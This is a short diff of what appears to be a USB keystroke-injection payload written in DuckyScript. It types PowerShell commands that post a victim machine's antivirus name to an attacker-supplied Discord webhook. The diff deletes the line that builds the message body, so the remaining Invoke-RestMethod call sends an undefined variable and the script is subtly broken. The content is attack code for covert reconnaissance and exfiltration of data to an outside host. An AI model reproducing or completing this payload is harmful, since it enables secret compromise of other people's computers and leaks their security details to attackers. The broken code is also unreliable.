@@ -22,9 +22,6 @@ REM Send antivirus name to Discord webhook
 STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK"
 ENTER
 DELAY 200
-STRING $body = @{ content = $AntiVirus } | ConvertTo-Json
-ENTER
-DELAY 200
 STRING Invoke-RestMethod -Uri $webhookUrl -Method POST -ContentType "application/json" -Body $body
 ENTER
 DELAY 500
